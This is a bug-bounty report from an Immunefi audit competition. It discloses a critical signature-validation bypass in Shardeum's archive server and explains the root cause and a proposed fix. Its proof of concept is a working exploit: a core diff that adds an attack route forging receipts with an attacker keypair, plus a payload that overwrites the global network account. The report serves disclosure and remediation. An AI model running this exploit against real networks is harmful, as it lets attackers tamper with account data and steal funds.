# 39872 \[W\&A-Critical] bypass receipt signing validation

## #39872 \[W\&A-Critical] Bypass Receipt Signing Validation

**Submitted on Feb 9th 2025 at 15:55:37 UTC by @Blockian for** [**Audit Comp | Shardeum: Ancillaries III**](https://immunefi.com/audit-competition/audit-comp-shardeum-ancillaries-iii)

* **Report ID:** #39872
* **Report Type:** Websites and Applications
* **Report severity:** Critical
* **Target:** https://github.com/shardeum/archive-server/tree/itn4
* **Impacts:**
  * Direct theft of user funds

### Description

## **Shardeum Ancillaries**

### **Bypass Receipt Signing Validation**

#### **Description**

A vulnerability in the `storeReceiptData` function allows a malicious validator to bypass signing validation. This enables them to store arbitrary receipts and overwrite any account data on the archive server. (Including Global Account)

### **Root Cause**

The function `verifyAppliedReceiptSignatures` validates `signaturePack` by ensuring that the signatures themselves are valid. However, it does not check whether the signatures originate from actual nodes within the system.

At first glance, this seems acceptable since `signaturePack` goes through a prior validation in `verifyReceiptData`. However, this verification contains a critical flaw. Let's examine the relevant snippet of `verifyReceiptData`:

```ts
// ...
    const requiredSignatures =
      config.usePOQo === true
        ? Math.ceil(votingGroupCount * config.requiredVotesPercentage)
        : Math.round(votingGroupCount * config.requiredVotesPercentage)
    if (signaturePack.length < requiredSignatures) {
      Logger.mainLogger.error(
        `Invalid receipt appliedReceipt signatures count is less than requiredSignatures, ${signaturePack.length}, ${requiredSignatures}`
      )
      if (nestedCountersInstance)
        nestedCountersInstance.countEvent(
          'receipt',
          'Invalid_receipt_appliedReceipt_signatures_count_less_than_requiredSignatures'
        )
      return result
    }
    // Using a set to store the unique signatures to avoid duplicates
    const uniqueSigners = new Set()
    for (const signature of signaturePack) {
      const { owner: nodePubKey } = signature
      // Get the node id from the public key
      const node = cycleShardData.nodes.find((node) => node.publicKey === nodePubKey)
      if (node == null) {
        Logger.mainLogger.error(
          `The node with public key ${nodePubKey} of the receipt ${txId}} with ${timestamp} is not in the active nodesList of cycle ${cycle}`
        )
        if (nestedCountersInstance)
          nestedCountersInstance.countEvent(
            'receipt',
            'appliedReceipt_signature_owner_not_in_active_nodesList'
          )
        continue
      }
      // Check if the node is in the execution group
      if (!cycleShardData.parititionShardDataMap.get(homePartition).coveredBy[node.id]) {
        Logger.mainLogger.error(
          `The node with public key ${nodePubKey} of the receipt ${txId} with ${timestamp} is not in the execution group of the tx`
        )
        if (nestedCountersInstance)
          nestedCountersInstance.countEvent(
            'receipt',
            'appliedReceipt_signature_node_not_in_execution_group_of_tx'
          )
        continue
      }
      uniqueSigners.add(nodePubKey)
    }
    if (uniqueSigners.size < requiredSignatures) {
      Logger.mainLogger.error(
        `Invalid receipt appliedReceipt valid signatures count is less than requiredSignatures ${uniqueSigners.size}, ${requiredSignatures}`
      )
      if (nestedCountersInstance)
        nestedCountersInstance.countEvent(
          'receipt',
          'Invalid_receipt_appliedReceipt_valid_signatures_count_less_than_requiredSignatures'
        )
      return result
    }
// ...
```

#### **The Exploit Strategy**

There are two primary validation steps in `verifyReceiptData`:

1. The number of signatures in `signaturePack` must be **greater than or equal to** `requiredSignatures`.
2. The number of **unique** public keys from valid nodes in `signaturePack` must also be **greater than or equal to** `requiredSignatures`.

A malicious validator can exploit these checks as follows:

1. Populate `signaturePack` with **at least** `requiredSignatures` valid signatures, which can be generated by **any** key controlled by the attacker.
2. Include the public keys of all **valid** nodes, but pair them with **invalid** signatures.

This results in `signaturePack` containing `2 * requiredSignatures` entries:

* **Half** are valid signatures produced by the attacker.
* **Half** are invalid signatures that falsely claim to originate from valid nodes.

Despite the invalid signatures, `verifyReceiptData` considers the validation successful because the length condition is met.

Now, when `verifyAppliedReceiptSignatures` runs, it finds `requiredSignatures` valid signatures and **passes the check**, allowing the malicious validator to bypass signature validation.

### **Impact**

This vulnerability has the same impact as the issue reported [here](https://reports.immunefi.com/shardeum-ancillaries-ii/36025-w-and-a-critical-a-malicious-validator-can-overwrite-the-account-data-of-any-archive-server-co)

A malicious validator can modify **any account data** stored on an archive server if it is connected to the validator via a socket.io connection. This includes the **global network account**, posing a significant security risk.

### **Proposed Fix**

To prevent this exploit, `verifyAppliedReceiptSignatures` should:

* Verify each signature **only if** it originates from a **valid** node.
* Reject signatures from unverified sources before counting them.

### Proof of Concept

## Proof of Concept

1. Apply the following `git diff` on the Archiver for some nice logs and clarity:

```diff
diff --git a/src/GlobalAccount.ts b/src/GlobalAccount.ts
index d42adef..b77f308 100644
--- a/src/GlobalAccount.ts
+++ b/src/GlobalAccount.ts
@@ -33,8 +33,10 @@ export function getGlobalNetworkAccount(hash: boolean): object | string {
 }
 
 export function setGlobalNetworkAccount(account: AccountDB.AccountsCopy): void {
+  Logger.mainLogger.info(`changing cachedGlobalNetworkAccountHash: before ${cachedGlobalNetworkAccountHash}`)
   cachedGlobalNetworkAccount = rfdc()(account)
   cachedGlobalNetworkAccountHash = account.hash
+  Logger.mainLogger.info(`changing cachedGlobalNetworkAccountHash: after ${cachedGlobalNetworkAccountHash}`)
 }
 
 interface NetworkConfigChanges {
```

2. Apply the following `diff` on the Core:

```diff
diff --git a/src/p2p/Join/routes.ts b/src/p2p/Join/routes.ts
index f415f8ab..d0e8b60b 100644
--- a/src/p2p/Join/routes.ts
+++ b/src/p2p/Join/routes.ts
@@ -1,5 +1,6 @@
 /** ROUTES */
 
+import * as crypto from '@shardeum-foundation/lib-crypto-utils'
 import * as Comms from '../Comms'
 import * as CycleChain from '../CycleChain'
 import * as CycleCreator from '../CycleCreator'
@@ -46,6 +47,7 @@ import { testFailChance } from '../../utils'
 import { shardusGetTime } from '../../network'
 import { verifyPayload } from '../../types/ajv/Helpers'
 import { AJVSchemaEnum } from '../../types/enum/AJVSchemaEnum'
+import { instantForwardReceipts } from '../Archivers'
 
 
 const cycleMarkerRoute: P2P.P2PTypes.Route<Handler> = {
@@ -328,6 +330,142 @@ const standbyRefreshRoute: P2P.P2PTypes.Route<Handler> = {
   },
 }
 
+const createAttackReceipt = (inputs: any): any => {
+  const accountSpecificHash = (account: any): any => {
+    const { account: EVMAccountInfo, timestamp } = account
+    const accountData = { EVMAccountInfo, timestamp }
+    return crypto.hashObj(accountData)
+  }
+
+  const calculateVoteHash = (vote: any): any => {
+    const proposal = vote
+    const applyStatus = {
+      applied: proposal.applied,
+      cantApply: proposal.cant_preApply,
+    }
+    const accountsHash = crypto.hash(
+      crypto.hashObj(proposal.accountIDs) +
+        crypto.hashObj(proposal.beforeStateHashes) +
+        crypto.hashObj(proposal.afterStateHashes)
+    )
+    const proposalHash = crypto.hash(
+      crypto.hashObj(applyStatus) + accountsHash + proposal.appReceiptDataHash
+    )
+    return proposalHash
+  }
+
+  const accountHash = accountSpecificHash(inputs.afterState.data)
+  inputs.afterState.hash = accountHash
+  inputs.afterState.data.hash = accountHash
+
+  const proposal = {
+    accountIDs: [
+      inputs.afterState.accountId
+    ],
+    afterStateHashes: [
+      accountHash
+    ],
+    appReceiptDataHash: crypto.hashObj(inputs.appReceiptData),
+    applied: true,
+    beforeStateHashes: [
+      "6d92eaa97b3ba4f26143b4203b62b243055214eb03b072eb65b29d0eadbc6324"
+    ],
+    cant_preApply: false,
+    txid: inputs.txId
+  }
+
+  const signableObject = {
+    txid: inputs.txId,
+  	voteHash: calculateVoteHash(proposal),
+  	voteTime: inputs.voteTime
+  }
+
+  const signOnStuff = (payload: any, keyPair: any): any => crypto.sign(crypto.hashObj(payload), keyPair.secretKey)
+
+  const attackKeyPair = {
+    publicKey: "4b4d0378d88087d47074006fff1067f24d2b46f0b031dc0eac3c6aae89200f06",
+    secretKey:
+      "94a5acef210ee6d3fbadde8da6cd1246abf6259542265981edd0b1c63a3b2bc14b4d0378d88087d47074006fff1067f24d2b46f0b031dc0eac3c6aae89200f06",
+  }
+
+  const changeCasingOfPubKey = (pubKey: string, index: number): string => {
+    let counter = 0
+    let pubKeyCopy = pubKey
+    for (let i = 0; i < pubKey.length; i++) {
+      const char = pubKeyCopy[i]
+      if (char.toLowerCase() !== char.toUpperCase()) { // this is a letter
+        if (counter === index) {
+          pubKeyCopy = pubKeyCopy.substring(0, i) + char.toUpperCase() + pubKeyCopy.substring(i + 1)
+          return pubKeyCopy
+        } else counter += 1
+      }
+    }
+
+    return pubKeyCopy
+  }
+
+  const allNodesPublicKeys = nodeListFromStates([
+    P2P.P2PTypes.NodeStatus.ACTIVE,
+    P2P.P2PTypes.NodeStatus.READY,
+    P2P.P2PTypes.NodeStatus.SYNCING,
+  ]).map((node) => node.publicKey)
+
+  const sig = signOnStuff(signableObject, attackKeyPair)
+  const signaturePack1 = Array(allNodesPublicKeys.length).fill(0).map((e, i) => ({ owner: changeCasingOfPubKey(attackKeyPair.publicKey, i), sig: sig }))
+  const signaturePack2 = allNodesPublicKeys.map((e) => ({ owner: e, sig: sig }))
+  const signaturePack = [...signaturePack1, ...signaturePack2]
+  const voteOffsets = Array(allNodesPublicKeys.length * 2).fill(inputs.voteTime)
+
+  console.log(`verified BLOCKIAN: ${crypto.verifyObj({ ...signableObject, sign: {
+    owner: attackKeyPair.publicKey,
+    sig: sig
+  } })}`)
+
+  const attackReceipt = {
+    tx: {
+      txId: inputs.txId,
+      timestamp: 1,
+      originalTxData: {}
+    },
+    cycle: 15,
+    signedReceipt: {
+      proposal: proposal,
+      proposalHash: crypto.hashObj(proposal),
+      sign: {
+        owner: attackKeyPair.publicKey,
+        sig: sig
+      },
+      signaturePack: signaturePack,
+      voteOffsets: voteOffsets
+    },
+    beforeStates: [],
+    afterStates: [
+      inputs.afterState
+    ],
+    appReceiptData: inputs.appReceiptData,
+    executionShardKey: inputs.executionShardKey,
+    globalModification: true
+  }
+
+  return attackReceipt
+}
+
+const blockianRoute: P2P.P2PTypes.Route<Handler> = {
+  method: 'POST',
+  name: 'blockian',
+  handler: (req, res) => {
+    console.log("got request from blockian")
+    const body = req.body
+    if (body.debug) {
+      return res.json({ ...body, gotBlockianAttack: true })
+    }
+
+    instantForwardReceipts([createAttackReceipt(body.inputs)])
+
+    res.json({ success: true })
+  },
+}
+
 const joinedV2Route: P2P.P2PTypes.Route<Handler> = {
   method: 'GET',
   name: 'joinedV2/:publicKey',
@@ -778,7 +916,7 @@ const gossipStandbyRefresh: P2P.P2PTypes.GossipHandler<
 }
 
 export const routes = {
-  external: [cycleMarkerRoute, joinRoute, joinedRoute, joinedV2Route, acceptedRoute, unjoinRoute, standbyRefreshRoute],
+  external: [blockianRoute, cycleMarkerRoute, joinRoute, joinedRoute, joinedV2Route, acceptedRoute, unjoinRoute, standbyRefreshRoute],
   gossip: {
     'gossip-join': gossipJoinRoute,
     'gossip-valid-join-requests': gossipValidJoinRequests,
```

3. Send the following payload to the new `blockian` route after the network reaches cycle 15.

```json
{
  "inputs": {
    "txId": "4c3088d41bab7ed541856a5c5434648a3b31f5e18e0b7582a3067f6d9bbe90f4",
    "appReceiptData": {
      "data": {
        "amountSpent": "0x100",
        "readableReceipt": {
          "status": 1
        },
        "receipt": {
          "logs": []
        }
      }
    },
    "afterState": {
      "accountId": "1000000000000000000000000000000000000000000000000000000000000001",
      "cycleNumber": 15,
      "data": {
        "account": {
          "balance": "12345670000000000000000000000000",
          "nonce": "1"
        },
        "accountType": 0,
        "ethAddress": "0xe0291324263d7ec15fa3494bfdc1e902d8bd5d3d",
        "hash": "hash",
        "timestamp": 1739055681599
      },
      "timestamp": 1739055681599,
      "hash": "hash",
      "isGlobal": true
    },
    "voteTime": 7,
    "executionShardKey": "00000000"
  }
}
```

Now, you'll be able to see the logs of the global account changing:

```
[2025-02-09T16:12:45.427] [INFO] main - changing cachedGlobalNetworkAccountHash: before 47d6e983d5bda803e4517e6b883fc5b0e862ebd3f68ba77288fba9fb10e2d1e4
[2025-02-09T16:12:45.427] [INFO] main - changing cachedGlobalNetworkAccountHash: after 2ef35235179170de0b834e4c39830f443e010789102ff7e5e5708c2d27979862
```
